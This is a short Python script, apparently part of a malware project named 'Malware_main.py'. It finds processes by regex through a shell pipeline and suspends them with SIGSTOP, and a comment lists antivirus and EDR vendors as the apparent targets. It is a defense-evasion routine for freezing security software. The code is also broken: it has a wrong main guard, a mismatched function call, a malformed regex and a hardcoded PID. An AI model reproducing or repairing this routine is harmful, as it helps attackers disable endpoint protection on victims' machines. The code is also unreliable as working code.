import os
import signal

my_pid = os.getpid()
my_pid = '90626'
print("my pid :" +my_pid)
# output = os.popen(f'ps -o cmd={my_pid}').read()
# print(output)

def get_pids(regex):
    output = []
    # kaspersky, norton, corwdstrike, deepinstinct, sentinelone, checkpoint, cybereason
    cmd = f"ps -aef | grep -i -E '{regex}' | grep -v 'grep' | awk '{{ print $2 }}'" 
    output = os.popen(cmd).read()
    pids = output.strip().split('\n')
    print(pids)
    return pids


def check_process():
    pids = get_pids('*mclient$')
    print(pids)
    for pid in pids:
        print(pid)
        if pid != my_pid:
            print("kill " +pid)
            #os.popen('').read()
            os.kill(int(pid), signal.SIGSTOP)            




if __name__ == '__main':
    check_process('python3 Malware_main.py')
    pass